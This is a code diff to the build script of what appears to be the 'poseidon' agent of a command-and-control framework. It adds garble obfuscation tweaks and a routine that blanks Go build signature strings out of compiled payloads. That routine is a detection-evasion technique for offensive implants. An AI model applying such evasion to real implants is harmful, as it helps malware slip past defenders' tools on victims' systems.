@@ -20,7 +20,7 @@ import (
 	"time"
 )
 
-const version = "2.2.14"
+const version = "2.2.16"
 
 type sleepInfoStruct struct {
 	Interval int       `json:"interval"`
@@ -28,6 +28,10 @@ type sleepInfoStruct struct {
 	KillDate time.Time `json:"killdate"`
 }
 
+var badSigs = [][]byte{
+	{'G', 'o', ' ', 'b', 'u', 'i', 'l', 'd'},
+	{'g', 'o', '.', 'b', 'u', 'i', 'l', 'd'},
+}
 var payloadDefinition = agentstructs.PayloadType{
 	Name:                                   "poseidon",
 	FileExtension:                          "bin",
@@ -430,7 +434,7 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	}
 	command += "GOGARBLE=* "
 	if garble {
-		command += "/go/bin/garble -tiny -literals -debug -seed random build "
+		command += "garble -tiny -literals -debug -seed random build "
 	} else {
 		command += "go build "
 	}
@@ -612,6 +616,16 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 			payloadBuildResponse.UpdatedFilename = &updatedFilename
 		}
 	} else {
+		if garble {
+			for i, _ := range badSigs {
+				replacement := make([]byte, len(badSigs[i]))
+				for j, _ := range replacement {
+					replacement[j] = ' ' // keep same size, just change to spaces
+				}
+				payloadBytes = bytes.ReplaceAll(payloadBytes, badSigs[i], replacement)
+			}
+
+		}
 		payloadBuildResponse.Payload = &payloadBytes
 		payloadBuildResponse.Success = true
 		payloadBuildResponse.BuildMessage = "Successfully built payload!"
